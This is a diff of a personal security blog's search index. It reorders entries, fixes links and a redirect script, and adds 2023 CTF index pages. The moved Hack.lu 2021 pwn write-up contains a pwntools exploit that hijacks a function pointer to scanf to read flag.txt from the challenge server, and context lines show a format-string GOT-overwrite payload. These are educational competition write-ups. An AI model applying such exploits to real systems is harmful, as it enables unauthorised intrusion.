@@ -154,6 +154,12 @@
       </tags>
   </entry>
   <entry>
+    <title>数据火葬场~~~</title>
+    <url>/articles/shu-ju-huo-zang-chang/</url>
+    <content><![CDATA[<p>喵喵咪的，vps提供商断电了，博客全没了</p>
+]]></content>
+  </entry>
+  <entry>
     <title>Pwn - Return to dl-resolve Technique</title>
     <url>/articles/ret2-dl-resolve-example-silent-rop/</url>
     <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>in th recent k3rn31ctf, there is a pwn question <strong>silent-ROP</strong>.</p>
@@ -268,12 +274,6 @@
         <tag>writeup</tag>
         <tag>ret2dlresolve</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>数据火葬场~~~</title>
-    <url>/articles/shu-ju-huo-zang-chang/</url>
-    <content><![CDATA[<p>喵喵咪的，vps提供商断电了，博客全没了</p>
-]]></content>
   </entry>
   <entry>
     <title>自制新插件添加~</title>
@@ -2229,7 +2229,7 @@ https://www.bsfdvbsbilibili.com
   <entry>
     <title>Breaking PrairieLearn Java Grader</title>
     <url>/articles/ctf/breaking-prairielearn-java-grader/</url>
-    <content><![CDATA[<h1 id="PrairieLearn-Java-Autograder-Vulnerability"><a href="#PrairieLearn-Java-Autograder-Vulnerability" class="headerlink" title="PrairieLearn Java Autograder Vulnerability"></a>PrairieLearn Java Autograder Vulnerability</h1><p>Aynakeya <a href="mailto:&#97;&#x79;&#x6e;&#97;&#x6b;&#x65;&#121;&#x61;&#46;&#111;&#102;&#102;&#105;&#99;&#x69;&#x61;&#108;&#64;&#x67;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#109;">&#97;&#x79;&#x6e;&#97;&#x6b;&#x65;&#121;&#x61;&#46;&#111;&#102;&#102;&#105;&#99;&#x69;&#x61;&#108;&#64;&#x67;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#109;</a></p>
+    <content><![CDATA[<h1 id="PrairieLearn-Java-Autograder-Vulnerability"><a href="#PrairieLearn-Java-Autograder-Vulnerability" class="headerlink" title="PrairieLearn Java Autograder Vulnerability"></a>PrairieLearn Java Autograder Vulnerability</h1><p>Aynakeya <a href="mailto:&#97;&#x79;&#x6e;&#x61;&#x6b;&#x65;&#121;&#97;&#x2e;&#x6f;&#x66;&#x66;&#105;&#99;&#x69;&#x61;&#x6c;&#64;&#103;&#x6d;&#x61;&#105;&#x6c;&#46;&#x63;&#111;&#109;">&#97;&#x79;&#x6e;&#x61;&#x6b;&#x65;&#121;&#97;&#x2e;&#x6f;&#x66;&#x66;&#105;&#99;&#x69;&#x61;&#x6c;&#64;&#103;&#x6d;&#x61;&#105;&#x6c;&#46;&#x63;&#111;&#109;</a></p>
 <h1 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h1><p>This is a walkthrough of one vulnerability I found in PrairieLearn Java autograder. </p>
 <p>The default Java autograder exists vulnerabilities that allow user to leak information and write files to the container.</p>
 <p>These vulnerabilities allow the user to modify the result of autograder score and get 100% without writing any actual code.</p>
@@ -2960,16 +2960,16 @@ https://www.bsfdvbsbilibili.com
 
 <p>0x18 is an intriguing value, precisely 192 bits. This instantly reminded me of aes-192 encryption. In fact, if you search &quot;192 bit encryption&quot; on Google, the first result typically points towards AES.</p>
 <p>But how can we ascertain that this is indeed AES encryption? While we could manually verify it, we also need to identify the encryption mode and its IV (Initialization Vector).</p>
-<p>I began by trying out CBC mode, primarily because it&#39;s commonly employed. Also, due to the nature of CBC mode (as detailed on <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB)">Wikipedia</a>), it&#39;s straightforward to verify it by using the initial 16 bytes as the IV.</p>
+<p>I began by trying out CBC mode, primarily because it&#39;s commonly employed. Also, due to the nature of CBC mode (as detailed on <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC)">Wikipedia</a>), it&#39;s straightforward to verify it by using the initial 16 bytes as the IV.</p>
 <p><img data-src="/images/reverse-with-puring-guessing-ximalaya/Screenshot_20230828_225450.png" alt="Screenshot_20230828_225450"></p>
 <p><img data-src="/images/reverse-with-puring-guessing-ximalaya/Screenshot_20230828_225547.png" alt="Screenshot_20230828_225547"></p>
 <p>uhhhhhh, wtf, it indeed was the CBC mode  (Coooooooool). Now, the task was to identify the IV.</p>
 <h2 id="Finding-Parameters"><a href="#Finding-Parameters" class="headerlink" title="Finding Parameters"></a>Finding Parameters</h2><p>Since the encryption function doesn&#39;t explicitly demand an IV, there are two possibilities. The IV could either be generated based on <code>trackId</code> (since the data would eventually be encrypted) or it could be randomly generated and then appended to the returned value.</p>
 <p>The latter can be quickly ruled out, given the length of the return value doesn&#39;t seem to have room for an appended IV. This points to the former - the IV might be derived from the <code>trackId</code>. But how?</p>
 <p>To solve this, I started with the simplest assumption: that the first 16 bytes of the <code>trackId</code> were being used as the IV.</p>
-<p><img data-src="/images/reverse-with-puring-guessing-ximalaya/Screenshot_20230828_225547-1693291441850-4.png" alt="Screenshot_20230828_225547"></p>
+<p><img data-src="/images/reverse-with-puring-guessing-ximalaya/Screenshot_20230828_230258.png" alt="Screenshot_20230828_230258"></p>
 <p>LOOOOOOOL, it is same as the key. wtf is your encryption bro. </p>
-<p>But then another challenge arose. The <code>xm_encryptor</code> can also process a <code>trackId</code> with a length less than 24 bytes. Knowing that AES-192 cannot work with a key length other than 24 bytes, I assert that the software must somehow pad the <code>trackId</code> with some additional characters.</p>
+<p>But then another challenge arose. The <code>xm_encryptor</code> can also process a <code>trackId</code> with a length less than 24 bytes. Knowing that AES-192 cannot work with a key length other than 24 bytes, I assert that the algorithm must somehow pad the <code>trackId</code> with some additional characters.</p>
 <p>Our task now was to identify the padding characters and its padding method. Since the encryption needed to support variable <code>trackId</code> lengths and since the padding was done based on our provided <code>trackId</code>, the most straightforward solution would be to pad with some constant characters. </p>
 <p>There are also two types of simplest padding methods, one is to pad behind the <code>trackId</code>, and the other is to pad in front.</p>
 <p>So at this time, there is one simple but effective method - <strong>Bruteforce</strong>. One byte by one byte. We only need to run 256*24&#x3D;6144 iterations. Not even hitting 10k.</p>
@@ -3656,47 +3656,24 @@ https://www.bsfdvbsbilibili.com
         let newPath = currentURL.replace(regexPattern, "/articles/");
         
         document.getElementById("redirectDetails").style.display = "block"; // Show the redirect notice
-
+    
         // For manual redirection
         document.querySelector("#redirectDetails summary").nextElementSibling.lastElementChild.href = newPath;
-
+    
         let countdown = 5;
-
+    
         function countdown_to_redirect() {
           document.getElementById('countdown').textContent = countdown;
-          countdown -= 1;
-          if(countdown === 0){
+          if(countdown <= 0){
             window.location.href = newPath;
             return;
           }
-          setTimeout(countdown_to_redirect, 1000);
-        }
-        countdown_to_redirect();
-    }
-</script>
-
-<!-- <script>
-    if (true) {
-        let newPath = '/blog';
-        
-        document.getElementById("redirectDetails").style.display = "block"; // Show the redirect notice
-
-        // For manual redirection
-        document.querySelector("#redirectDetails summary").nextElementSibling.lastElementChild.href = newPath;
-
-        let countdown = 5;
-
-        function countdown_to_redirect() {
-          document.getElementById('countdown').textContent = countdown;
           countdown -= 1;
-          if(countdown === 0){
-            window.location.href = newPath;
-          }
           setTimeout(countdown_to_redirect, 1000);
         }
         countdown_to_redirect();
     }
-</script> -->]]></content>
+</script>]]></content>
   </entry>
   <entry>
     <title>about</title>
@@ -3955,6 +3932,45 @@ https://www.bsfdvbsbilibili.com
 ]]></content>
   </entry>
   <entry>
+    <title>【Hack.lu CTF 2021】secure prototype 【pwn】</title>
+    <url>/ctf-writeup/2021/hackerluctf/hacker-lu-2021-secure-prototype.html</url>
+    <content><![CDATA[<h1 id="0x1-introduction"><a href="#0x1-introduction" class="headerlink" title="0x1 introduction"></a>0x1 introduction</h1><p><a href="https://flu.xxx/challenges/16">https://flu.xxx/challenges/16</a></p>
+<h1 id="0x3-Mitigations"><a href="#0x3-Mitigations" class="headerlink" title="0x3 Mitigations"></a>0x3 Mitigations</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     arm-32-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    Canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x3-Solution"><a href="#0x3-Solution" class="headerlink" title="0x3 Solution"></a>0x3 Solution</h1><p>challenge contains 3 file, challenge.elf, stonks.txt, flag.txt</p>
+<p>using decompiler and take a deep look at functions.</p>
+<span id="more"></span>
+
+<p><img data-src="/images/2021-10-31_151419.jpg" alt="2021-10-31_151419.jpg"></p>
+<p>after enter the correct command and enter three variable, it will jump to function at 108e0, 108e0 contains a switch that call different function depending on the command user enter.</p>
+<p><img data-src="/images/2021-10-31_151832.jpg" alt="2021-10-31_151832.jpg"></p>
+<p>notice that string &quot;stonks.txt&quot; are stored in the <code>byte_22058</code>, and with commmand <em>48</em>, function <code>sub_10B80</code> will read <code>byte_22058</code> as a filename, and print out whether in the file.</p>
+<p>so, we got an idea that if we need get the flag, we need to change <code>byte_22058</code> to &quot;flag.txt&quot; instead of &quot;stonks.txt&quot;</p>
+<p>looking at other commands, command <em>1056</em> allow us pass a integer as a pointer to an function (lets say <strong>funcA</strong>).</p>
+<p>and with command <em>4619</em>, we have call <strong>funcA</strong> with our 1st and 2nd parameter.</p>
+<p>so, here is the question. Is there any function that take 2 pointer parameter and can modify a string. </p>
+<p>the answer is <code>plt:00010570 __isoc99_scanf</code>, we can use <code>scanf(&quot;%s&quot;,char* str)</code> to read input from stdin and write str.</p>
+<p>in this case, str is the address of <code>byte_22058</code>, and &quot;%s&quot; can also found in the data section.</p>
+<p>therefore, we have the process of getting the flag.</p>
+<ol>
+<li>use 1056: change function address to scanf</li>
+<li>use 4619: call scanf and write flag.txt to byte_22058</li>
+<li>use 48: print out the file content in filename(byte_22058)</li>
+</ol>
+<h1 id="0x4-exp-py"><a href="#0x4-exp-py" class="headerlink" title="0x4 exp.py"></a>0x4 exp.py</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=flu.xxx&#x27; &#x27;--port=20040&#x27; challenge.elf</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;challenge.elf&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;flu.xxx&#x27;</span><br><span class="line">port = int(args.PORT or 20040)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak *0x&#123;exe.entry:x&#125;</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     arm-32-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    Canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x10000)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">print(1,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;1056&quot;)</span><br><span class="line">print(2,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;66928 0 0&quot;)</span><br><span class="line">print(3,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;4919&quot;)</span><br><span class="line">print(4,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;70140 139352 0&quot;)</span><br><span class="line">io.sendline(b&quot;flag.txt\x00&quot;)</span><br><span class="line">print(5,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;48&quot;)</span><br><span class="line">print(6,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;123 456 789&quot;)</span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&quot;%%s&quot;,0x111fc)</span><br><span class="line">print(&quot;22058&quot;,0x0022058)</span><br><span class="line">print(&quot;scanf&quot;,0x00010570)</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x5-flag"><a href="#0x5-flag" class="headerlink" title="0x5 flag"></a>0x5 flag</h1><p>flag{gl0bal_st0nkz_and_gl0bal_var1abl3}</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Hacker.lu CTF 2021</title>
+    <url>/ctf-writeup/2021/hackerluctf/index.html</url>
+    <content><![CDATA[<h1 id="Hacker-lu-CTF-2021"><a href="#Hacker-lu-CTF-2021" class="headerlink" title="Hacker.lu CTF 2021"></a>Hacker.lu CTF 2021</h1><h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
+<li><a href="./hacker-lu-2021-secure-prototype">[Pwn] secure-prototype</a></li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
     <title>[writeup][DownUnderCTF 2021] pwn Leaking like a sieve</title>
     <url>/ctf-writeup/2021/downunderctf/ductf2021-pwn-Leaking-like-a-sieve.html</url>
     <content><![CDATA[<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
@@ -4160,45 +4176,6 @@ https://www.bsfdvbsbilibili.com
 ]]></content>
   </entry>
   <entry>
-    <title>【Hack.lu CTF 2021】secure prototype 【pwn】</title>
-    <url>/ctf-writeup/2021/hackerluctf/hacker-lu-2021-secure-prototype.html</url>
-    <content><![CDATA[<h1 id="0x1-introduction"><a href="#0x1-introduction" class="headerlink" title="0x1 introduction"></a>0x1 introduction</h1><p><a href="https://flu.xxx/challenges/16">https://flu.xxx/challenges/16</a></p>
-<h1 id="0x3-Mitigations"><a href="#0x3-Mitigations" class="headerlink" title="0x3 Mitigations"></a>0x3 Mitigations</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     arm-32-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    Canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x3-Solution"><a href="#0x3-Solution" class="headerlink" title="0x3 Solution"></a>0x3 Solution</h1><p>challenge contains 3 file, challenge.elf, stonks.txt, flag.txt</p>
-<p>using decompiler and take a deep look at functions.</p>
-<span id="more"></span>
-
-<p><img data-src="/images/2021-10-31_151419.jpg" alt="2021-10-31_151419.jpg"></p>
-<p>after enter the correct command and enter three variable, it will jump to function at 108e0, 108e0 contains a switch that call different function depending on the command user enter.</p>
-<p><img data-src="/images/2021-10-31_151832.jpg" alt="2021-10-31_151832.jpg"></p>
-<p>notice that string &quot;stonks.txt&quot; are stored in the <code>byte_22058</code>, and with commmand <em>48</em>, function <code>sub_10B80</code> will read <code>byte_22058</code> as a filename, and print out whether in the file.</p>
-<p>so, we got an idea that if we need get the flag, we need to change <code>byte_22058</code> to &quot;flag.txt&quot; instead of &quot;stonks.txt&quot;</p>
-<p>looking at other commands, command <em>1056</em> allow us pass a integer as a pointer to an function (lets say <strong>funcA</strong>).</p>
-<p>and with command <em>4619</em>, we have call <strong>funcA</strong> with our 1st and 2nd parameter.</p>
-<p>so, here is the question. Is there any function that take 2 pointer parameter and can modify a string. </p>
-<p>the answer is <code>plt:00010570 __isoc99_scanf</code>, we can use <code>scanf(&quot;%s&quot;,char* str)</code> to read input from stdin and write str.</p>
-<p>in this case, str is the address of <code>byte_22058</code>, and &quot;%s&quot; can also found in the data section.</p>
-<p>therefore, we have the process of getting the flag.</p>
-<ol>
-<li>use 1056: change function address to scanf</li>
-<li>use 4619: call scanf and write flag.txt to byte_22058</li>
-<li>use 48: print out the file content in filename(byte_22058)</li>
-</ol>
-<h1 id="0x4-exp-py"><a href="#0x4-exp-py" class="headerlink" title="0x4 exp.py"></a>0x4 exp.py</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=flu.xxx&#x27; &#x27;--port=20040&#x27; challenge.elf</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;challenge.elf&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;flu.xxx&#x27;</span><br><span class="line">port = int(args.PORT or 20040)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak *0x&#123;exe.entry:x&#125;</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     arm-32-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    Canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x10000)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">print(1,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;1056&quot;)</span><br><span class="line">print(2,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;66928 0 0&quot;)</span><br><span class="line">print(3,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;4919&quot;)</span><br><span class="line">print(4,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;70140 139352 0&quot;)</span><br><span class="line">io.sendline(b&quot;flag.txt\x00&quot;)</span><br><span class="line">print(5,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;48&quot;)</span><br><span class="line">print(6,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;123 456 789&quot;)</span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&quot;%%s&quot;,0x111fc)</span><br><span class="line">print(&quot;22058&quot;,0x0022058)</span><br><span class="line">print(&quot;scanf&quot;,0x00010570)</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x5-flag"><a href="#0x5-flag" class="headerlink" title="0x5 flag"></a>0x5 flag</h1><p>flag{gl0bal_st0nkz_and_gl0bal_var1abl3}</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>Hacker.lu CTF 2021</title>
-    <url>/ctf-writeup/2021/hackerluctf/index.html</url>
-    <content><![CDATA[<h1 id="Hacker-lu-CTF-2021"><a href="#Hacker-lu-CTF-2021" class="headerlink" title="Hacker.lu CTF 2021"></a>Hacker.lu CTF 2021</h1><h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
-<li><a href="./hacker-lu-2021-secure-prototype">[Pwn] secure-prototype</a></li>
-</ul>
-]]></content>
-  </entry>
-  <entry>
     <title>Seccon CTF 2021</title>
     <url>/ctf-writeup/2021/secconctf/index.html</url>
     <content><![CDATA[<h1 id="Seccon-CTF-2021"><a href="#Seccon-CTF-2021" class="headerlink" title="Seccon CTF 2021"></a>Seccon CTF 2021</h1><h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
@@ -4355,6 +4332,61 @@ https://www.bsfdvbsbilibili.com
 
 <p>use <code>ciphey</code> to get the flag. FU trendmicro.</p>
 <p><img data-src="/images/trendmirco-2021-rev-1-100-PyPuzzle/Untitled6.png" alt="Untitled"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Bo1lersCTF 2023</title>
+    <url>/ctf-writeup/2023/bo1lersctf/index.html</url>
+    <content><![CDATA[<h1 id="Bo1lersCTF-2023"><a href="#Bo1lersCTF-2023" class="headerlink" title="Bo1lersCTF 2023"></a>Bo1lersCTF 2023</h1><p><a href="https://ctftime.org/event/1875">https://ctftime.org/event/1875</a></p>
+<p><a href="https://github.com/b01lers/b01lers-ctf-2023-public">https://github.com/b01lers/b01lers-ctf-2023-public</a></p>
+<h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><p>1 th place (<a href="https://ctftime.org/team/73723">MapleBacon</a>)</p>
+<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
+<li><a href="./pwn/cfifufuuufuuuuu">[pwn] cfifufuuufuuuuu</a></li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>Kalmar CTF 2023</title>
+    <url>/ctf-writeup/2023/kalmar/index.html</url>
+    <content><![CDATA[<h1 id="Kalmar-CTF-2023"><a href="#Kalmar-CTF-2023" class="headerlink" title="Kalmar CTF 2023"></a>Kalmar CTF 2023</h1><p><a href="https://ctftime.org/event/1878/">https://ctftime.org/event/1878/</a></p>
+<h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><p>16th place (<a href="https://ctftime.org/team/73723">MapleBacon</a>)</p>
+<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
+<li><a href="./pwn/js-in-my-bs">[pwn] js-in-my-bs</a></li>
+<li><a href="./pwn/mjs">[pwn] mjs</a></li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>LACTF 2023</title>
+    <url>/ctf-writeup/2023/lactf/index.html</url>
+    <content><![CDATA[<h1 id="LA-CTF-2023"><a href="#LA-CTF-2023" class="headerlink" title="LA CTF 2023"></a>LA CTF 2023</h1><p><a href="https://platform.lac.tf/">https://platform.lac.tf/</a></p>
+<h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><p>7 th place (<a href="https://ctftime.org/team/73723">MapleBacon</a>)</p>
+<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
+<li>[[pwn] bot]</li>
+<li>[[pwn] rickroll]</li>
+<li>[[pwn] rut-roh-relro]</li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>MagpieCTF 2023</title>
+    <url>/ctf-writeup/2023/magpiectf/index.html</url>
+    <content><![CDATA[<h1 id="MagpieCTF-2023"><a href="#MagpieCTF-2023" class="headerlink" title="MagpieCTF 2023"></a>MagpieCTF 2023</h1><p><a href="https://github.com/infosec-ucalgary/magpieCTF-2023">https://github.com/infosec-ucalgary/magpieCTF-2023</a></p>
+<h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><p>5 th place (<a href="https://ctftime.org/team/73723">MapleBacon</a>)</p>
+<h1 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h1><p>this ctf is literally a guessing game.</p>
+<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
+<li><a href="./writeup">writeup</a></li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>PicoCTF 2023</title>
+    <url>/ctf-writeup/2023/picoctf/index.html</url>
+    <content><![CDATA[<h1 id="PicoCTF-2023"><a href="#PicoCTF-2023" class="headerlink" title="PicoCTF 2023"></a>PicoCTF 2023</h1><p><a href="https://play.picoctf.org/">https://play.picoctf.org/</a></p>
+<p><strong>pwn full clear</strong></p>
+<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
+<li>todo</li>
+</ul>
 ]]></content>
   </entry>
   <entry>
@@ -4860,58 +4892,51 @@ https://www.bsfdvbsbilibili.com
 <h1 id="0x3-Exploits"><a href="#0x3-Exploits" class="headerlink" title="0x3 Exploits"></a>0x3 Exploits</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io = connect(&quot;pwn.utctf.live&quot;, 5004)</span><br><span class="line"></span><br><span class="line">print(&quot;got __stack_chk_fail,&quot;,hex(exe.got[&quot;__stack_chk_fail&quot;]))</span><br><span class="line">payload1 = flat(&#123;</span><br><span class="line">    0x0:exe.got[&quot;__stack_chk_fail&quot;],</span><br><span class="line">    0x150 - 0xe0: b&#x27;%%%dx%%6$hn\x00&#x27; % 0x1349</span><br><span class="line">&#125;,filler=b&quot;A&quot;)</span><br><span class="line">io.sendlineafter(b&quot;do you have?\n&quot;,payload1)</span><br><span class="line"># trigger stack chk fail</span><br><span class="line">io.sendlineafter(b&quot;Give me your data\n&quot;,b&quot;A&quot;*0x70)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
   </entry>
   <entry>
-    <title>Bo1lersCTF 2023</title>
-    <url>/ctf-writeup/2023/bo1lersctf/index.html</url>
-    <content><![CDATA[<h1 id="Bo1lersCTF-2023"><a href="#Bo1lersCTF-2023" class="headerlink" title="Bo1lersCTF 2023"></a>Bo1lersCTF 2023</h1><p><a href="https://ctftime.org/event/1875">https://ctftime.org/event/1875</a></p>
-<p><a href="https://github.com/b01lers/b01lers-ctf-2023-public">https://github.com/b01lers/b01lers-ctf-2023-public</a></p>
-<h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><p>1 th place (<a href="https://ctftime.org/team/73723">MapleBacon</a>)</p>
-<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
-<li><a href="./pwn/cfifufuuufuuuuu">[pwn] cfifufuuufuuuuu</a></li>
-</ul>
-]]></content>
-  </entry>
-  <entry>
-    <title>Kalmar CTF 2023</title>
-    <url>/ctf-writeup/2023/kalmar/index.html</url>
